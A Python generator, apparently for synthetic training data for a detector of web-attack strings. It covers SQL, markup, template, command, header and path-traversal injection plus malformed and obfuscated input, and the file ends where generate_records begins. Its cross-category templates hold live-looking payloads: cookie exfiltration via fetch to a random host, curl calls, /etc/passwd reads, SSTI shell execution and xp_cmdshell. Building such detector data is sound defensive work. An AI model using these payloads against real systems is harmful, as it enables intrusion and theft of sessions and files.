#!/usr/bin/env python3
"""Synthetic training-corpus generator for `string2fingerprint`.

Standard library only, deterministic for a given seed. Produces multi-label
samples of untrusted web text (benign and attack) for training a small MLP
over hashed byte n-gram counts.

Label bitmask (bit i set => category i applies; benign == 0):

    0 malformed          structurally broken bytes
    1 obfuscation        layered/evasive encoding
    2 sql_injection
    3 markup_injection   XSS / HTML / XML injection
    4 path_traversal
    5 command_injection
    6 template_injection  SSTI / EL / jndi
    7 header_injection    CR/LF injection, response splitting

The grammars of the six injection categories live in `attacks.py`. Benign
text, the pools that benign and attack carriers share (parameter names,
cookie names, JSON keys, neutral hosts), corruption of benign samples, and the
final benign check live in `benign.py`. Most malformed samples are a
benign sample with one structural damage, emitted near its clean twin. Some
obfuscation samples are a benign value with layered encoding, emitted near
its plain or single-layer form. See `generate_records()`.

The corpus is training data for a detector. Samples are short synthetic
strings and are not working exploits for any particular system.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import struct
import sys
from collections import deque
from typing import Iterable, Iterator, List, NamedTuple, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import attacks  # noqa: E402  (attack grammars)
import obfuscation  # noqa: E402  (obfuscating encodings)
import benign  # noqa: E402  (benign text, shared pools, corruption)

CATEGORIES: Tuple[str, ...] = (
    "malformed",
    "obfuscation",
    "sql_injection",
    "markup_injection",
    "path_traversal",
    "command_injection",
    "template_injection",
    "header_injection",
)

M_MALFORMED = 1 << 0
M_OBFUSCATION = 1 << 1
M_SQL = 1 << 2
M_MARKUP = 1 << 3
M_PATH = 1 << 4
M_CMD = 1 << 5
M_TEMPLATE = 1 << 6
M_HEADER = 1 << 7

MAX_LEN = 512


# --------------------------------------------------------------------------
# Low-level encoding helpers
# --------------------------------------------------------------------------

_UNRESERVED = frozenset(
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"
)


def _as_bytes(x) -> bytes:
    if isinstance(x, bytes):
        return x
    if isinstance(x, bytearray):
        return bytes(x)
    return x.encode("utf-8", "surrogatepass")


def pct_encode(data, space_as_plus: bool = False, safe: bytes = b"") -> bytes:
    """Single-layer percent-encoding of a value."""
    b = _as_bytes(data)
    safeset = set(safe)
    out = bytearray()
    for c in b:
        if c in _UNRESERVED or c in safeset:
            out.append(c)
        elif space_as_plus and c == 0x20:
            out.append(0x2B)
        else:
            out += b"%%%02X" % c
    return bytes(out)


def pct_encode_all(data) -> bytes:
    """Percent-encode every byte (used to build further layers)."""
    b = _as_bytes(data)
    out = bytearray()
    for c in b:
        if c in _UNRESERVED:
            out.append(c)
        else:
            out += b"%%%02X" % c
    return bytes(out)


def valid_utf8(b: bytes) -> bool:
    try:
        b.decode("utf-8")
        return True
    except UnicodeDecodeError:
        return False


def has_low_control(b: bytes) -> bool:
    """True if any byte < 0x20 is present (any C0 control incl. tab/CR/LF)."""
    return any(c < 0x20 for c in b)


# --------------------------------------------------------------------------
# Obfuscation transforms (see `obfuscation.py`)
# --------------------------------------------------------------------------

obfuscate = obfuscation.obfuscate
_overlong_utf8 = obfuscation.overlong_utf8


# --------------------------------------------------------------------------
# Attack grammars (see `attacks.py`)
# --------------------------------------------------------------------------

PARAM_NAMES = benign.PARAM_NAMES  # one pool shared by benign and attack carriers
rand_ident = attacks.rand_ident
rand_host = attacks.rand_host
gen_sql = attacks.gen_sql
gen_markup = attacks.gen_markup
gen_path = attacks.gen_path
gen_cmd = attacks.gen_cmd
gen_template = attacks.gen_template
gen_header = attacks.gen_header


_LEGACY_CODECS = (
    ("latin", "latin-1"), ("latin", "cp1252"), ("ko", "euc_kr"), ("ko", "cp949"), ("ja", "shift_jis"),
    ("ja", "euc_jp"), ("zh", "gbk"), ("zh", "big5"), ("ru", "cp1251"), ("ru", "koi8_r"), ("el", "iso8859_7"),
    ("he", "cp1255"), ("ar", "cp1256"), ("th", "tis_620"), ("vi", "cp1258"),
)
_MAGIC = (b"\x89PNG\r\n\x1a\n", b"PK\x03\x04", b"\x1f\x8b\x08", b"\xff\xd8\xff\xe0", b"GIF89a\x01\x00",
          b"%PDF-1.7\n%\xe2\xe3\xcf\xd3", b"\x7fELF\x02\x01\x01", b"MZ\x90\x00", b"\xca\xfe\xba\xbe",
          b"SQLite format 3\x00", b"\x00asm\x01\x00\x00\x00", b"BZh91AY&SY")


def _legacy_text(rng: random.Random) -> bytes:
    """Text in a legacy single- or double-byte encoding, which is not valid UTF-8."""
    for _ in range(8):
        script, codec = rng.choice(_LEGACY_CODECS)
        text = benign.script_text(rng, script)[: rng.randint(6, 80)]
        try:
            data = text.encode(codec)
        except UnicodeEncodeError:
            data = text.encode(codec, "ignore")
        if not valid_utf8(data):
            return data
    return "caf\u00e9 cr\u00e8me".encode("latin-1")


def gen_malformed(rng: random.Random) -> Tuple[bytes, int]:
    flavor = rng.choice(
        ("trunc", "stray", "badlead", "badsecond", "nul", "c0", "badpct", "badpct", "binary",
         "overlong", "legacy", "legacy", "utf16", "magic", "ansi", "surrogate", "c1", "trunc_end",
         "nul_run", "bad_pct_u")
    )
    mask = M_MALFORMED
    # optional benign-ish ascii context
    ctx = ""
    if rng.random() < 0.5:
        ctx = rng.choice(PARAM_NAMES) + "="
    out = bytearray(ctx.encode("ascii"))
    if flavor == "trunc":
        lead = rng.choice((0xE2, 0xE0, 0xF0, 0xC3, 0xED, 0xF4, 0xD0, 0xEA, 0xE3))
        out.append(lead)
        if rng.random() < 0.5:
            out.append(rng.choice((0x82, 0x9F, 0x80, 0xA0, 0xB0)))
        if rng.random() < 0.5:
            out += rand_ident(rng, 1, 6).encode()
    elif flavor == "stray":
        for _ in range(rng.randint(1, 4)):
            out.append(rng.randint(0x80, 0xBF))
    elif flavor == "badlead":
        out.append(rng.choice((0xC0, 0xC1, 0xF5, 0xF6, 0xF7, 0xF8, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF)))
        out += bytes(rng.randint(0x80, 0xBF) for _ in range(rng.randint(1, 5)))
    elif flavor == "badsecond":
        out.append(rng.choice((0xE2, 0xF0, 0xC3, 0xD0, 0xEC)))
        out.append(rng.randint(0x00, 0x7F))  # invalid continuation
    elif flavor == "nul":
        out += rand_ident(rng, 2, 6).encode()
        out.append(0x00)
        out += rand_ident(rng, 2, 6).encode()
    elif flavor == "nul_run":
        out += rand_ident(rng, 2, 8).encode() + b"\x00" * rng.randint(2, 24)
    elif flavor == "c0":
        out += rand_ident(rng, 2, 5).encode()
        out.append(rng.choice((0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x0B, 0x0C, 0x0E, 0x10, 0x1A, 0x1B, 0x1F)))
        out += rand_ident(rng, 2, 5).encode()
    elif flavor == "ansi":
        out += rand_ident(rng, 2, 6).encode()
        out += rng.choice((b"\x1b[31m", b"\x1b[0m", b"\x1b[2J", b"\x1b[1;32m", b"\x1b]0;" + rand_ident(rng, 2, 6).encode() + b"\x07",
                           b"\x1b[H", b"\x1b[?25l", b"\x1b[K"))
        out += rand_ident(rng, 2, 6).encode()
    elif flavor == "c1":
        out += rand_ident(rng, 1, 5).encode() + bytes((rng.randint(0x80, 0x9F),)) + rand_ident(rng, 1, 5).encode()
    elif flavor == "badpct":
        bad = rng.choice(
            ("%zz", "%gg", "%4", "%2", "%", "%%", "abc%", "%2g", "%x1", "a%", "foo%2", "%u", "val%ue%",
             "%2.", "%G0", "%-1", "%%%", "100%", "%0", "%A", "%3z", "%+2", "%~", "%e%", "% 20")
        )
        out += bad.encode("ascii")
        if rng.random() < 0.4:
            out += rand_ident(rng, 2, 6).encode()
    elif flavor == "bad_pct_u":
        out += rng.choice((b"%u", b"%U", b"%u00", b"%u12G4", b"%uzzzz", b"%u0")) + rand_ident(rng, 0, 4).encode()
    elif flavor == "binary":
        n = rng.randint(4, 24)
        for _ in range(n):
            out.append(rng.randint(0, 255))
        # guarantee a disqualifying byte
        out[rng.randrange(len(ctx), len(out)) if len(out) > len(ctx) else -1] = rng.choice(
            (0x00, 0xFF, 0xC0, 0x1B, 0x85))
    elif flavor == "magic":
        out += rng.choice(_MAGIC) + bytes(rng.randint(0, 255) for _ in range(rng.randint(0, 24)))
    elif flavor == "legacy":
        out += _legacy_text(rng)
    elif flavor == "utf16":
        text = rng.choice((rand_ident(rng, 3, 12), benign.english_sentence(rng)[:40], benign.script_text(rng)[:20]))
        out += rng.choice((b"", b"\xff\xfe", b"\xfe\xff")) + text.encode(rng.choice(("utf-16-le", "utf-16-be")))
    elif flavor == "surrogate":
        out += rand_ident(rng, 0, 5).encode() + bytes((0xED, rng.randint(0xA0, 0xBF), rng.randint(0x80, 0xBF)))
        if rng.random() < 0.5:
            out += bytes((0xED, rng.randint(0xB0, 0xBF), rng.randint(0x80, 0xBF)))
    elif flavor == "trunc_end":
        text = benign.script_text(rng)[: rng.randint(3, 40)].encode("utf-8")
        leads = [i for i, c in enumerate(text) if c >= 0xC2]
        if leads:
            i = rng.choice(leads)
            text = text[: i + 1]
        out += text
    else:  # overlong (invalid utf-8), which `obfuscation.py` also labels obfuscation
        mask |= M_OBFUSCATION
        out += _overlong_utf8(rng.choice(("..", "/", "<script>", "../etc", "'", "<", "%", rand_ident(rng, 1, 5))))
    b = bytes(out)
    # Make sure it is truly malformed by our test's criteria.
    if not benign.is_malformed(b):
        # fall back: append a stray continuation byte
        b = b + bytes((rng.randint(0x80, 0xBF),))
    return b, mask


_OBF_TOKENS = (
    ".", "..", "../", "/", "\\", "<", ">", "'", '"', "admin", "root", "etc/passwd", "<a>", "<b>", "SELECT", "select",
    "union", "cat", "id", "' or", "script", "alert", "javascript", "onerror", "eval", "document.cookie",
    "cmd", "exec", "system", "/bin/sh", "passwd", "../../", "%", "&", "=", ";", "|", "${", "{{", "\r\n",
)


def gen_obfuscation(rng: random.Random) -> Tuple[bytes, int]:
    """Obfuscation as the primary category: obfuscate some inner content."""
    r = rng.random()
    if r < 0.55:
        # obfuscate an attack payload -> attack bit + obfuscation
        inner_gen = rng.choice((gen_sql, gen_markup, gen_path, gen_cmd, gen_template, gen_header))
        raw, inner_mask = inner_gen(rng)
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            text = raw.decode("latin-1")
        if rng.random() < 0.25:
            return obfuscation.layered(text, rng, inner_mask)
        return obfuscate(text, rng, inner_mask)
    # obfuscate a benign or neutral token -> obfuscation alone
    token = rng.choice((
        rand_ident(rng, 4, 10), rng.choice(_OBF_TOKENS), rng.choice(_OBF_TOKENS), rng.choice(PARAM_NAMES),
        benign.ident(rng), benign.english_sentence(rng)[: rng.randint(4, 30)].strip() or "hello",
        benign.posix_path(rng), benign.neutral_host(rng),
    ))
    if rng.random() < 0.2:
        return obfuscation.layered(token, rng, 0)
    return obfuscate(token, rng, 0)


CAT_GEN = {
    M_SQL: gen_sql,
    M_MARKUP: gen_markup,
    M_PATH: gen_path,
    M_CMD: gen_cmd,
    M_TEMPLATE: gen_template,
    M_HEADER: gen_header,
    M_MALFORMED: gen_malformed,
    M_OBFUSCATION: gen_obfuscation,
}

_ATTACK_BITS = [
    M_MALFORMED, M_OBFUSCATION, M_SQL, M_MARKUP, M_PATH, M_CMD,
    M_TEMPLATE, M_HEADER,
]


# --------------------------------------------------------------------------
# Multi-label combiner
# --------------------------------------------------------------------------

def cross_category(rng: random.Random) -> Tuple[bytes, int]:
    """One payload that is an attack in two categories at once."""
    host = rand_host(rng)
    target = attacks.rand_sensitive_file(rng)
    up = rng.choice(("../", "..\\", "..%2f", "%2e%2e/")) * rng.randint(2, 8)
    js = rng.choice(("alert(1)", "alert(document.domain)", f"fetch('//{host}/'+document.cookie)", "prompt(%d)" % rng.randint(0, 99)))
    q = rng.choice(("'", "\"", ""))
    kind = rng.randint(0, 9)
    if kind == 0:  # command reads a traversed file
        return (f"{rng.choice((';', '|', '&&', '`'))} {rng.choice(('cat', 'type', 'head', 'tail', 'more'))} {up}{target}").encode(), M_CMD | M_PATH
    if kind == 1:  # SQL returns markup
        return (f"{q} {attacks.kw(rng, 'union')} {attacks.kw(rng, 'select')} '<script>{js}</script>'{rng.choice(('--', '#', '-- -'))}").encode(), M_SQL | M_MARKUP
    if kind == 2:  # SQL reads a traversed file
        return (f"{q} {attacks.kw(rng, 'union')} {attacks.kw(rng, 'select')} {attacks.kw(rng, 'load_file')}('{up}{target}'){rng.choice(('--', '#'))}").encode(), M_SQL | M_PATH
    if kind == 3:  # template runs a command
        cmd = rng.choice(("id", "whoami", "cat /etc/passwd", "curl http://%s/" % host))
        return rng.choice((f"{{{{''.__class__.__mro__[1].__subclasses__()[{rng.randint(40, 400)}]('{cmd}',shell=True)}}}}; {cmd}",
                           f"${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}`{cmd}`")).encode(), M_TEMPLATE | M_CMD
    if kind == 4:  # response splitting with a script body
        nl = rng.choice(("%0d%0a", "\r\n", "%0a"))
        return (f"{attacks.rand_word(rng)}{nl}Content-Type: text/html{nl}{nl}<script>{js}</script>").encode(), M_HEADER | M_MARKUP
    if kind == 5:  # XML external entity that reads a traversed file
        e = attacks.rand_ident(rng, 2, 5)
        return (f"<!DOCTYPE r [<!ENTITY {e} SYSTEM \"file://{up}{target}\">]><r>&{e};</r>").encode(), M_MARKUP | M_PATH
    if kind == 6:  # markup that loads a template
        return (f"<img src=x onerror=\"{js}\">{{{{{rng.randint(2, 99)}*{rng.randint(2, 99)}}}}}").encode(), M_MARKUP | M_TEMPLATE
    if kind == 7:  # traversal inside a template include
        return (f"{{% include '{up}{target}' %}}").encode(), M_TEMPLATE | M_PATH
    if kind == 8:  # SQL stacked with a shell command
        return (f"{q}; {attacks.kw(rng, 'exec')} master..xp_cmdshell '{rng.choice(('whoami', 'ping ' + host))}'--| {rng.choice(('id', 'whoami'))}").encode(), M_SQL | M_CMD
    # header injection carrying a traversal location
    nl = rng.choice(("%0d%0a", "\r\n"))
    return (f"{nl}Location: /{up}{target}").encode(), M_HEADER | M_PATH


def combine(rng: random.Random, payload: bytes, mask: int) -> Tuple[bytes, int]:
    options = ["append", "append", "cross"]
    can_text = valid_utf8(payload) and not has_low_control(payload)
    if not (mask & M_MALFORMED):
        options += ["nul", "ctrl", "bad_utf8"]
        if can_text:
            options += ["obf", "obf", "layered", "overlong"]
    choice = rng.choice(options)
    if choice == "append":
        other_bit = rng.choice([b for b in _ATTACK_BITS if b not in (M_OBFUSCATION,) and not (mask & b)] or _ATTACK_BITS)
        raw, m2 = CAT_GEN[other_bit](rng)
        sep = rng.choice((" ", "&" + rng.choice(PARAM_NAMES) + "=", "; ", "|", "/", "", "\n", ","))
        if rng.random() < 0.5:
            return payload + sep.encode("latin-1", "ignore") + raw, mask | m2
        return raw + sep.encode("latin-1", "ignore") + payload, mask | m2
    if choice == "cross":
        raw, m2 = cross_category(rng)
        return raw, m2
    if choice == "nul":
        pos = rng.randint(0, len(payload))
        return payload[:pos] + b"\x00" * rng.choice((1, 1, 1, 2, 4)) + payload[pos:], mask | M_MALFORMED
    if choice == "ctrl":
        pos = rng.randint(0, len(payload))
        c = bytes((rng.choice((0x01, 0x07, 0x08, 0x0B, 0x0C, 0x1B, 0x1F)),))
        return payload[:pos] + c + payload[pos:], mask | M_MALFORMED
    if choice == "bad_utf8":
        pos = rng.randint(0, len(payload))
        junk = rng.choice((b"\xc0", b"\xff", b"\xfe", b"\x80", b"\xe2\x82", b"\xed\xa0\x80", b"\xf8\x88\x80\x80\x80"))
        return payload[:pos] + junk + payload[pos:], mask | M_MALFORMED
    if choice == "overlong":
        text = payload.decode("utf-8")
        cut = rng.randint(1, len(text))
        if rng.random() < 0.5:
            return _overlong_utf8(text[:cut]) + text[cut:].encode("utf-8"), mask | M_OBFUSCATION | M_MALFORMED
        return _overlong_utf8(text[: rng.randint(1, len(text))]) + payload, mask | M_OBFUSCATION | M_MALFORMED
    text = payload.decode("utf-8")
    if choice == "layered":
        return obfuscation.layered(text, rng, mask)
    # obf: wrap whole payload with an obfuscation technique
    return obfuscate(text, rng, mask)


# --------------------------------------------------------------------------
# Carrier embedding
# --------------------------------------------------------------------------

def _rand_params(rng: random.Random, n: int) -> List[Tuple[str, str]]:
    # Surrounding parameters drawn from the shared pools (same for benign and attack).
    return [(rng.choice(PARAM_NAMES), benign.query_value(rng)) for _ in range(n)]


_URLISH = frozenset(("query", "form", "cookie", "path", "header:referer"))
_MUST_ENCODE = frozenset(b"%&=#+;")


def _has_valid_escape(b: bytes) -> bool:
    hexd = b"0123456789abcdefABCDEF"
    return any(b[j] == 0x25 and b[j + 1] in hexd and b[j + 2] in hexd for j in range(len(b) - 2))


def embed_many(rng: random.Random, values: List[bytes], mask: int, is_benign: bool = False,
               allow_encode: bool = True) -> Tuple[List[bytes], str]:
    """Wrap each value in ONE shared carrier context (same surroundings for all).

    The carrier set, parameter names, cookie names, JSON keys, hosts and
    surrounding text are identical for benign values and attack payloads.
    Single-layer transport encoding never adds a label bit; it is skipped for
    malformed values (it would launder the bad bytes) and for values that
    already contain a %XX escape (re-encoding them would be double encoding).
    """
    malformed = bool(mask & M_MALFORMED)
    can_text = all(valid_utf8(v) and not has_low_control(v) for v in values)
    can_encode = allow_encode and not malformed and not any(_has_valid_escape(v) for v in values)

    carriers = ["bare", "query", "query", "form", "cookie", "header", "header", "path", "prose", "prose"]
    if can_text and not (mask & M_HEADER):
        carriers += ["json", "json"]
    carrier = rng.choice(carriers)
    hkind = rng.choice(("ua", "referer", "xff", "cookie")) if carrier == "header" else ""
    urlish = carrier in _URLISH or hkind == "referer"
    plus = rng.random() < 0.5 and carrier != "path"
    if urlish and can_encode:
        if is_benign:
            # a real client encodes reserved characters; raw spaces/non-ASCII sometimes survive in logs
            needs = any(c in _MUST_ENCODE for v in values for c in v)
            encode = needs or rng.random() < 0.7
        else:
            encode = rng.random() < 0.5
    else:
        encode = False

    def enc(v: bytes) -> bytes:
        return pct_encode(v, space_as_plus=plus) if encode else v

    name = "header:" + hkind if hkind else carrier
    outs: List[bytes] = []

    if carrier == "bare":
        return list(values), name

    if carrier in ("query", "form"):
        params = _rand_params(rng, rng.choices((0, 1, 2, 3, 4, 5), (20, 25, 22, 15, 10, 8))[0])
        key = rng.choice(PARAM_NAMES).encode()
        at = rng.randint(0, len(params))
        path = benign.url_path(rng, rng.randint(0, 3)).encode() if carrier == "query" else b""
        for v in values:
            pairs = [k.encode() + b"=" + pv.encode() for k, pv in params]
            pairs.insert(at, key + b"=" + enc(v))
            body = b"&".join(pairs)
            outs.append(path + b"?" + body if carrier == "query" else body)
        return outs, name

    if carrier == "cookie" or hkind == "cookie":
        cname = rng.choice(benign.COOKIE_NAMES).encode()
        extras = [b.encode() for b in benign.cookie_header(rng).split("; ")][:rng.randint(0, 3)]
        at = rng.randint(0, len(extras))
        for v in values:
            parts = list(extras)
            parts.insert(at, cname + b"=" + enc(v))
            outs.append(b"; ".join(parts))
        return outs, name

    if hkind == "ua":
        ua = benign.user_agent(rng).encode()
        mode = rng.random()
        for v in values:
            if mode < 0.5 and b")" in ua:
                i = ua.index(b")")
                outs.append(ua[:i] + b"; " + v + ua[i:])
            elif mode < 0.8:
                outs.append(ua + b" " + v)
            else:
                outs.append(v + b" " + ua)
        return outs, name

    if hkind == "referer":
        base = ("https://" + benign.neutral_host(rng) + benign.url_path(rng)).encode()
        key = rng.choice(PARAM_NAMES).encode()
        others = b"".join(b"&" + k.encode() + b"=" + pv.encode() for k, pv in _rand_params(rng, rng.randint(0, 2)))
        return [base + b"?" + key + b"=" + enc(v) + others for v in values], name

    if hkind == "xff":
        ips = [benign.ipv4(rng).encode() for _ in range(rng.randint(1, 3))]
        at = rng.randint(0, len(ips))
        for v in values:
            lst = list(ips)
            lst.insert(at, v)
            outs.append(b", ".join(lst))
        return outs, name

    if carrier == "path":
        segs = benign.url_path(rng, rng.randint(1, 4)).strip("/").split("/")
        at = rng.randint(0, len(segs))
        tail = ("?" + benign.query_string(rng)).encode() if rng.random() < 0.25 else b""
        for v in values:
            parts = [s.encode() for s in segs]
            parts.insert(at, enc(v))
            outs.append(b"/" + b"/".join(parts) + tail)
        return outs, name

    if carrier == "prose":
        text = benign.english_sentence(rng) if rng.random() < 0.75 else benign.script_text(rng)
        words = text.split(" ")
        at = rng.randint(0, len(words))
        pre, post = " ".join(words[:at]), " ".join(words[at:])
        wrap = rng.choice(((b"", b""), (b"", b""), (b'"', b'"'), (b"'", b"'"), (b"(", b")"), (b"[", b"]"), (b": ", b"")))
        for v in values:
            s = (pre.encode() + b" " if pre else b"") + wrap[0] + v + wrap[1] + (b" " + post.encode() if post else b"")
            outs.append(s)
        return outs, name

    # json: same document shape for every value; only the injected string differs
    key = rng.choice(benign.JSON_KEYS)
    ensure_ascii = rng.random() < 0.4
    others = [(rng.choice(benign.JSON_KEYS), rng.choice((
        rng.randint(0, 9999), True, False, None, benign.query_value(rng), benign.name(rng),
        round(rng.random() * 100, 2)))) for _ in range(rng.randint(0, 3))]
    at = rng.randint(0, len(others))
    nest = rng.choice((None, None, "data", "params", "payload", "user", "item"))
    seps = rng.choice(((",", ":"), (", ", ": ")))
    for v in values:
        items = list(others)
        items.insert(at, (key, v.decode("utf-8")))
        doc = dict(items)
        if key not in doc or doc[key] != v.decode("utf-8"):
            doc[key] = v.decode("utf-8")
        if nest:
            doc = {nest: doc}
        outs.append(json.dumps(doc, ensure_ascii=ensure_ascii, separators=seps).encode("utf-8"))
    return outs, "json"


# --------------------------------------------------------------------------
# Benign generators -> (bytes, 0)
# --------------------------------------------------------------------------


# --------------------------------------------------------------------------
# Hard negatives -> (bytes, 0)
# --------------------------------------------------------------------------

def _hard_negative(rng: random.Random) -> bytes:
    g = rng.randint(0, 15)
    if g == 0:  # prose with SQL words
        return rng.choice((
            "Please select one item from the list and drop me a line.",
            "Union members should order lunch where 1 of 5 options applies.",
            "We will update the table and delete the old draft tomorrow.",
            "Insert the key, then select your language from the menu.",
            "Drop by the office; the group meets where the project started.",
        )).encode()
    if g == 1:  # names with apostrophes
        return rng.choice((
            "O'Brien and d'Angelo met at O'Reilly's shop.",
            "Contact: Sinéad O'Connor, d'Artagnan, N'Golo.",
            "The order for O'Malley's café is ready.",
        )).encode("utf-8")
    if g == 2:  # contractions
        return rng.choice((
            "I can't believe it won't work; let's don't worry.",
            "They're sure it isn't ready, but we'll see what's next.",
            "You've got what's needed; it'd be fine if we're late.",
        )).encode()
    if g == 3:  # math / comparisons
        return rng.choice((
            "a < b and c > d, so x=1 and 1+1=2.",
            "50% off today, 100% satisfaction, price = $42.",
            "if x > 0 and y < 10 then z = x + y.",
            "ratio a/b where a=3, b=4, result < 1.",
        )).encode()
    if g == 4:  # quoted speech
        return rng.choice((
            'She said, "meet me where the river bends," and left.',
            'He wrote: "select the best option" in the margin.',
            '"Drop the act," they laughed, "and join the union."',
        )).encode()
    if g == 5:  # ordinary file paths
        return rng.choice((
            "./docs/readme.md", "/usr/local/bin/tool", "C:\\Users\\me\\file.txt",
            "src/main/java/App.java", "~/projects/app/index.html",
            "./build/output/app.log", "/var/data/report-2024.csv",
        )).encode()
    if g == 6:  # version strings with ..
        return rng.choice((
            "supports versions 1.2..3.4 of the spec",
            "range 10..20 inclusive, step 2",
            "see pages 5...12 for details",
            "v1.0.0..v2.0.0 changelog",
            "chapters 3..7 cover the basics",
        )).encode()
    if g == 7:  # shell-like words in prose
        return rng.choice((
            "I love cat pictures; ping me when you can.",
            "Who am I to judge? Just echo my thoughts back.",
            "Let's grep through the notes and tail the summary.",
            "The cat sat by the shell on the beach.",
        )).encode()
    if g == 8:  # currency / amounts
        return rng.choice((
            "Total: $100.00, tax $8.50, tip $15.",
            "Budget is $1,250 for Q3 and $980 for Q4.",
            "Refund of $42.99 processed on Nov 3.",
        )).encode()
    if g == 9:  # hashtags / css colors
        return rng.choice((
            "Loving the new look #design #ui color #fff on #000 background",
            "background:#1a2b3c; color:#fff; border:#ccc",
            "#throwback to #summer2024 vibes",
        )).encode()
    if g == 10:  # email headers quoted in single-line prose
        return rng.choice((
            "He forwarded it with Subject: Re: lunch and To: team@list.",
            "The header said From: ops and Date: Monday.",
            "Set the Reply-To: support line before sending.",
        )).encode()
    if g == 11:  # programming discussion naming tags/functions
        return rng.choice((
            "Use the script tag to load the bundle, then call init().",
            "The img element needs an alt attribute for accessibility.",
            "Wrap it in a div and style the body selector.",
            "The select element fires an onchange event in the browser.",
        )).encode()
    if g == 12:  # harmless inline formatting
        return rng.choice((
            "This is <b>bold</b> and this is <i>italic</i> text.",
            "Line one<br>line two<br>line three.",
            "Click <a>here</a> for the summary below.",
            "Use <code>x+1</code> in the example.",
        )).encode()
    if g == 13:  # regex snippets
        return rng.choice((
            "pattern: ^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}$",
            "match /\\d{3}-\\d{4}/ for phone numbers",
            "use \\b(foo|bar)\\b to find whole words",
            "strip with s/\\s+/ /g before parsing",
        )).encode()
    if g == 14:  # semicolon / pipe separated benign lists
        return rng.choice((
            "apples; oranges; bananas; pears; grapes",
            "red | green | blue | yellow | orange",
            "name; email; phone; city; status",
            "step 1; step 2; step 3; done",
        )).encode()
    # g == 15: comparisons & relative refs mixing < > =
    return rng.choice((
        "Compare: 3 < 5, 10 > 2, 7 = 7, and 4 != 5.",
        "The function f(x) = x^2 grows when x > 1.",
        "Set width=100 height=50 and margin=0 in config.",
        "temperature >= 20C and humidity <= 60% today",
    )).encode()


class Record(NamedTuple):
    payload: bytes
    mask: int
    kind: str     # benign | hardneg | clean_pair | plain_pair | corrupt | obf_pair | attack
    pair: int     # id shared by the halves of a pair, else -1
    carrier: str  # carrier name, or "family:<name>" for standalone benign text


P_BENIGN_DRAW = 0.46     # pair halves add the rest of the benign mass (~50% overall)
P_HARDNEG = 0.20
P_BENIGN_CARRIER = 0.38
P_CORRUPT = 0.80         # share of malformed draws that are corruptions of a benign sample
P_ENC_PAIR = 0.45        # share of obfuscation draws that are benign encoding pairs
P_COMBINE = 0.25         # multi-label combiner rate for ordinary attack draws


def _benign_record(rng: random.Random) -> Tuple[bytes, str, str]:
    """One benign sample that passes benign.benign_ok(): (bytes, kind, carrier)."""
    for _ in range(64):
        r = rng.random()
        if r < P_HARDNEG:
            b, kind, car = _hard_negative(rng), "hardneg", "family:hardneg"
        elif r < P_HARDNEG + P_BENIGN_CARRIER:
            v = benign.benign_value(rng).encode("utf-8")
            (b,), car = embed_many(rng, [v], 0, is_benign=True)
            kind = "benign"
        else:
            b, fam = benign.sample(rng)
            kind, car = "benign", "family:" + fam
        if benign.benign_ok(b):
            return b, kind, car
    return b"ok", "benign", "family:fallback"


def _corruption_pair(rng: random.Random, pid: int) -> List[Record]:
    for _ in range(32):
        if rng.random() < 0.5:
            clean, _, car = _benign_record(rng)
        else:
            clean, car = benign.corruption_base(rng), "family:corruption_base"
            if not benign.benign_ok(clean):
                continue
        if len(clean) > MAX_LEN - 16:
            continue
        bad = benign.corrupt(rng, clean)
        if len(bad) <= MAX_LEN and benign.is_malformed(bad):
            out = [Record(bad, M_MALFORMED, "corrupt", pid, car)]
            if rng.random() < 0.95:
                out.append(Record(clean, 0, "clean_pair", pid, car))
            return out
    return []


def _encoding_pair(rng: random.Random, pid: int) -> List[Record]:
    """Benign value in three forms: plain, single-layer encoded (benign), and
    double/%u/entity-run/escape-run encoded (obfuscation bit only)."""
    for _ in range(16):
        text = benign.pair_source_value(rng)
        raw = text.encode("utf-8")
        single = pct_encode(raw, space_as_plus=rng.random() < 0.5)
        tech = rng.choice(("double", "double", "triple", "partial", "u", "entity", "entity", "escape", "escape", "css"))
        if tech in ("double", "triple"):
            first = single if b"%" in single else b"".join(b"%%%02X" % c for c in raw)
            obf = pct_encode(first)
            if tech == "triple":
                obf = pct_encode(obf)
        elif tech == "partial":
            obf = obfuscation.partial_double_pct(text, rng)
        elif tech == "u":
            obf = obfuscation.u_encode(text, rng)
        elif tech == "entity":
            obf = obfuscation.entity_run(text, rng).encode("utf-8")
        elif tech == "escape":
            obf = obfuscation.escape_run(text, rng).encode("utf-8")
        else:
            obf = obfuscation.css_escape_run(text, rng).encode("utf-8")
        (o_obf, o_single, o_plain), car = embed_many(rng, [obf, single, raw], M_OBFUSCATION, allow_encode=False)
        if len(o_obf) > MAX_LEN:
            continue
        out = [Record(o_obf, M_OBFUSCATION, "obf_pair", pid, car)]
        plain_ok = car in ("bare", "prose", "json", "header:ua") and not any(c in b"%&=#+;" for c in raw)
        prefer_plain = tech in ("entity", "escape", "css")
        cands = [o_plain, o_single] if (prefer_plain and plain_ok) else [o_single, o_plain] if plain_ok else [o_single]
        for cand in cands:
            if len(cand) <= MAX_LEN and benign.benign_ok(cand):
                out.append(Record(cand, 0, "plain_pair", pid, car))
                break
        return out
    return []


def _draw(rng: random.Random, pid: int) -> List[Record]:
    if rng.random() < P_BENIGN_DRAW:
        b, kind, car = _benign_record(rng)
        return [Record(b, 0, kind, -1, car)]
    for _ in range(64):
        bit = rng.choice(_ATTACK_BITS)
        if bit == M_MALFORMED and rng.random() < P_CORRUPT:
            recs = _corruption_pair(rng, pid)
            if recs:
                return recs
            continue
        if bit == M_OBFUSCATION and rng.random() < P_ENC_PAIR:
            recs = _encoding_pair(rng, pid)
            if recs:
                return recs
            continue
        payload, mask = CAT_GEN[bit](rng)
        if rng.random() < P_COMBINE:
            payload, mask = combine(rng, payload, mask)
        (sample,), car = embed_many(rng, [payload], mask)
        if 1 <= len(sample) <= MAX_LEN:
            return [Record(sample, mask, "attack", -1, car)]
        # too long: regenerate so labels stay truthful
    b, kind, car = _benign_record(rng)
    return [Record(b, 0, kind, -1, car)]


# --------------------------------------------------------------------------
# Public API
# --------------------------------------------------------------------------

def generate_records(seed: int, count: int) -> Iterator[Record]:
